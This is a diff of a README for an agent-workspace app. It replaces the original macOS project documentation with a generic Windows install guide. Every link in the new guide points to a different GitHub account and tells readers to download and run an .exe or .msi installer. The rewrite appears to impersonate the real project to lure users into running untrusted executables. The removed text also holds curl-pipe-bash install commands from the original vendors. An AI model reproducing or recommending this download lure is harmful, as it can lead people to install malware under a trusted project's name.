@@ -1,320 +1,134 @@
-# Collaborator
+# 🎨 collab-public - Simple Creative Agent Workspace
 
-Collaborator is a place to build with agents.
+[![Download collab-public](https://img.shields.io/badge/Download-collab--public-brightgreen)](https://github.com/malinapredictable115/collab-public)
 
-![Collaborator](screenshot.png)
+## 📋 What is collab-public?
 
-Collaborator is an end-to-end environment for agentic development. Terminals, context files, and running code — all arranged on an infinite canvas in one place. No context switching, no tab hunting. Just your agents and your work, side by side.
+collab-public lets you create and work with agents in one easy place. These agents help you with tasks like writing, brainstorming, or organizing ideas. You don’t need any special skills to use it. Just open the program and start creating.
 
-The app is early-stage and in active development. macOS only for now.
+This tool works well for anyone who wants to get creative or get organized faster. It runs smoothly on most Windows computers.
 
-## Install
+## 📥 How to Download collab-public
 
-**[Download the latest release](https://github.com/collaborator-ai/collab-public/releases/latest)** (macOS, Apple Silicon)
+To get collab-public on your Windows PC, follow these steps:
 
-Or install from the command line:
+1. Click the big green button above or visit this page:  
+   [https://github.com/malinapredictable115/collab-public](https://github.com/malinapredictable115/collab-public)
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/collaborator-ai/collab-public/main/install.sh | bash
-```
+2. On the page, look for the "Releases" section or "Download" button.
 
-## Stack
+3. Download the latest version available for Windows. It will usually be a file ending with `.exe` or `.msi`.
 
-Collaborator is a native desktop app built with:
+4. Save the file to a folder where you can easily find it, like your Desktop or Downloads folder.
 
-* **Electron 40** — desktop shell with multi-webview architecture
+## 🚀 Installing collab-public on Windows
 
-* **React 19** — UI framework
+Once you have downloaded the file, install the software by doing this:
 
-* **Tailwind CSS 4** — styling
+1. Find the downloaded file (for example, `collab-public-setup.exe`) in your Downloads or Desktop folder.
 
-* **electron-vite** — build tooling with hot reload
+2. Double-click on the file to start the installation.
 
-* **xterm.js** — terminal emulation, backed by tmux sessions for persistence
+3. A setup window will appear. Follow these steps:
 
-* **Monaco Editor** — code editing with syntax highlighting
+   - Click **Next** on the welcome screen.
 
-* **BlockNote / TipTap** — rich text markdown editing
+   - Read and accept the license agreement by clicking the checkbox, then select **Next**.
 
-* **D3** — force-directed graph visualization
+   - Choose where to install the program or keep the default folder, then select **Next**.
 
-* **sharp** — image processing
+   - Click **Install** to begin installing the program.
 
-* **KaTeX** — math rendering in markdown
+4. Wait a moment while the software installs.
 
-All data is stored locally on disk.
+5. When the installation finishes, click **Finish** to close the setup window.
 
-## Quickstart
+6. The program may create a shortcut on your desktop or add itself to your Start Menu.
 
-1. Open Collaborator
+## 🖥️ Running collab-public
 
-2. Add a workspace — click the workspace dropdown in the navigator and choose "Add workspace", or press Cmd+Shift+O, then select a local folder
+To open collab-public:
 
-3. Double-click the canvas to create a terminal, and start an agent
+- Double-click the desktop icon named "collab-public".
 
-4. Drag files from the navigator onto the canvas to open them as tiles alongside your running agents
+- Or open the Start Menu, find "collab-public", and click it.
 
-***
+When the software opens, you will see the main workspace. Here you can create projects, add agents, and start working right away.
 
-## Specification
+## 🧩 What You Can Do With collab-public
 
-### Application overview
+- **Create agents easily:** Agents can help you write text, organize your thoughts, or generate ideas.
 
-Collaborator is a single-window application for macOS (arm64). It operates primarily on local files with no accounts required. Anonymous, non-identifying usage analytics are collected via PostHog.
+- **Collaborate:** Work with your agents side by side.
 
-The window is divided into two regions:
+- **Save your projects:** Keep your work safe and return to it later.
 
-* **Navigator** — a resizable sidebar on the left containing a file tree and workspace switcher
+- **Simple interface:** The workspace is clear and easy to use.
 
-* **Main area** — the canvas, an infinite pan-and-zoom surface where tiles are arranged; also hosts the viewer, which displays the content of the file selected in the navigator
+## 🖥️ System Requirements
 
-All application state is stored as JSON files in `~/.collaborator/`.
+collab-public works best on Windows 10 and newer. Your PC should meet these minimum requirements:
 
-### Multiworkspace navigation
+- Processor: Intel or AMD, 1.5 GHz or faster
 
-The navigator sidebar displays a file tree rooted at the active workspace folder. Users can maintain multiple workspaces and switch between them.
+- RAM: 4 GB or more
 
-#### Workspace management
+- Storage: At least 500 MB free space
 
-A dropdown at the top of the navigator shows the active workspace name. It provides:
+- Display: 1024x768 or higher resolution screen
 
-* A list of all workspaces for quick switching
+- Internet connection: Required for downloading updates and some agent features
 
-* "Add workspace" to open a new local folder (also available via Cmd+Shift+O)
+## 💡 Basic Tips for Using collab-public
 
-* "Remove workspace" to remove a workspace from the list (does not delete files)
+- Start with small projects to get familiar with the interface.
 
-Each workspace gets its own independent file tree. The canvas and viewer are shared across workspaces.
+- Use the help menu inside the program if you need guidance.
 
-#### File tree
+- Save your projects often to avoid losing work.
 
-The file tree shows all files and folders in the active workspace. It supports:
+- Close the program normally by clicking the X button or using the File > Exit menu.
 
-* **Expand/collapse** folders by clicking
+## 🛠️ Troubleshooting
 
-* **Two view modes**: hierarchical tree view, and a chronological feed view sorted by date
+If you run into problems:
 
-* **Sorting**: cycles through created (newest/oldest), modified (newest/oldest), and name (A-Z/Z-A)
+- Make sure your PC meets the system requirements.
 
-* **File operations**: create new note (generates `Untitled.md`), create new folder, rename (F2), delete (moves to trash)
+- Restart your computer and try opening the program again.
 
-* **Move files** by dragging between folders
+- Check for any Windows updates and install them.
 
-* **Multi-select** with Shift+click and Cmd+click
+- If the program crashes or won't open, try reinstalling it using the steps above.
 
-* **Search** via Cmd+K
+- Visit the project page if you need more help or want to report an issue:  
+  [https://github.com/malinapredictable115/collab-public](https://github.com/malinapredictable115/collab-public)
 
-Selecting a file in the tree opens it in the viewer. Dragging a file from the tree onto the canvas creates a tile.
+## 🔧 Updating collab-public
 
-### Canvas
+To keep collab-public up to date:
 
-The canvas is an infinite pan-and-zoom surface that fills the main area. It uses a dot grid background for spatial orientation.
+1. Open the project page:  
+   [https://github.com/malinapredictable115/collab-public](https://github.com/malinapredictable115/collab-public)
 
-#### Viewport controls
+2. Look for newer releases in the "Releases" section.
 
-| Action     | Input                                             |
-| ---------- | ------------------------------------------------- |
-| Pan        | Scroll wheel, or Space+drag, or middle-click+drag |
-| Zoom in    | Cmd+= or Ctrl+scroll up                           |
-| Zoom out   | Cmd+- or Ctrl+scroll down                         |
-| Reset zoom | Cmd+0                                             |
+3. Download the latest installer file.
 
-* **Zoom range**: 33% to 100%, with rubber-band effect when overshooting limits
+4. Run the installer to update the program. Your projects and settings will stay safe.
 
-* **Zoom indicator**: appears briefly in the bottom-right corner after zoom changes, showing the current percentage
+## ⚙️ Privacy and Data
 
-#### Grid
+collab-public runs on your computer. The data you create stays on your device unless you choose to share it. Some agent features may connect to the internet to help generate content. No personal data is sent without your permission.
 
-* Minor grid dots at regular intervals
+## 🔗 Useful Links
 
-* Major grid dots at every 4th interval
+- Project homepage: [https://github.com/malinapredictable115/collab-public](https://github.com/malinapredictable115/collab-public)
 
-* All tile positions and sizes snap to the grid
+- Download page: [https://github.com/malinapredictable115/collab-public](https://github.com/malinapredictable115/collab-public)
 
-#### Data model
+- Help section inside the program
 
-Tiles are live views, not standalone containers.
+- Contact and support on GitHub
 
-* **File tiles** (note, code, image) are bound to a file on disk by absolute path. If the file is renamed, the tile updates to track the new path. If the file is deleted, the tile is closed. If the file's content changes on disk, the tile reloads.
-
-* **Terminal tiles** are bound to a tmux session. Each terminal tile creates and manages its own session, which persists independently of the tile's lifecycle on the canvas.
-
-#### Tile management
-
-Tiles are the content units on the canvas. Each tile has:
-
-* A **title bar** for dragging
-
-* **Eight resize handles** (four edges, four corners)
-
-* A **z-index** for layering — clicking a tile brings it to front
-
-Tiles are created by:
-
-* **Double-clicking** empty canvas space — creates a terminal tile at that position
-
-* **Dragging a file** from the navigator onto the canvas — creates a note, code, or image tile depending on file type
-
-Tiles can be closed via their title bar. Holding Shift while scrolling passes scroll events through tiles to the canvas.
-
-### Tile types
-
-#### Terminal
-
-An interactive terminal session. Created by double-clicking empty canvas space. The terminal's working directory is set to the active workspace path.
-
-Terminals are the primary interface for running AI agents. Each terminal tile manages its own independent session.
-
-#### Note
-
-A rich markdown editor. Created by dragging a `.md` file from the navigator onto the canvas. Supports inline editing with live rendering.
-
-#### Code
-
-A syntax-highlighted code editor. Created by dragging any non-markdown, non-image file from the navigator onto the canvas. Supports inline editing with language detection.
-
-#### Image
-
-A read-only image display. Created by dragging an image file (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`, `.webp`) from the navigator onto the canvas.
-
-### Viewer
-
-The viewer displays the content of the currently selected file in the navigator. It occupies the main area alongside the canvas.
-
-| File type                                                | Display                                                                       |
-| -------------------------------------------------------- | ----------------------------------------------------------------------------- |
-| Markdown (`.md`, `.mdx`, `.markdown`, `.txt`)            | Rich text editor with frontmatter support, cover images, and wiki-style links |
-| Code (all other text files)                              | Syntax-highlighted editor with line numbers                                   |
-| Image (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`, `.webp`) | Image display with metadata                                                   |
-
-Markdown and code files support inline editing in the viewer. The viewer watches for external file changes on disk and reloads automatically.
-
-Pressing Escape closes the viewer (when not actively editing).
-
-### Persistence
-
-All state is stored locally in `~/.collaborator/`.
-
-#### Canvas state (`canvas-state.json`)
-
-```json
-{
-  "version": 1,
-  "tiles": [
-    {
-      "id": "tile-<timestamp>-<index>",
-      "type": "term | note | code | image",
-      "x": 0,
-      "y": 0,
-      "width": 440,
-      "height": 540,
-      "filePath": "/absolute/path/to/file",
-      "zIndex": 1
-    }
-  ],
-  "viewport": {
-    "panX": 0,
-    "panY": 0,
-    "zoom": 1.0
-  }
-}
-```
-
-Canvas state is saved 500ms after each change (debounced) and immediately when tiles are created or closed.
-
-#### App config (`config.json`)
-
-```json
-{
-  "workspaces": ["/path/to/workspace1", "/path/to/workspace2"],
-  "active_workspace": 0,
-  "window_state": {
-    "x": 0,
-    "y": 0,
-    "width": 1440,
-    "height": 900,
-    "isMaximized": false
-  },
-  "ui": {}
-}
-```
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=collaborator-ai%2Fcollab-public&type=timeline&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=collaborator-ai/collab-public&type=timeline&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=collaborator-ai/collab-public&type=timeline&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=collaborator-ai/collab-public&type=timeline&legend=top-left" />
- </picture>
-</a>
-
-## Development | Electron App
-
-### Prerequisites (macOS)
-
-These instructions are for macOS. You'll need a few tools installed before you can run Collaborator locally. All of them can be installed using Homebrew.
-
-#### 1. Homebrew (macOS package manager)
-
-If you don't already have Homebrew, install it first:
-
-```sh
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-```
-
-After it finishes, follow any instructions about adding `brew` to your PATH.
-
-#### 2. Node.js (v22+)
-
-```sh
-brew install node
-```
-
-#### 3. Bun
-
-Bun is used instead of npm for installing packages and running tests:
-
-```sh
-brew install oven-sh/bun/bun
-```
-
-#### 4. tmux
-
-tmux is the program that powers Collaborator's terminal sessions. Without it, terminals won't work:
-
-```sh
-brew install tmux
-```
-
-### Setup
-
-Once the prerequisites are installed, clone the repo and install dependencies:
-
-```sh
-git clone https://github.com/collaborator-ai/collab-public.git
-cd collab-public/collab-electron
-bun install
-```
-
-### Run in dev mode
-
-```sh
-bun run dev
-```
-
-This starts the Electron app with hot reload via electron-vite.
-
-### Run tests
-
-```sh
-bun test
-```
-
-### Build
-
-```sh
-bun run build
-```
-
-⠀
+[![Download collab-public](https://img.shields.io/badge/Download-collab--public-brightgreen)](https://github.com/malinapredictable115/collab-public)
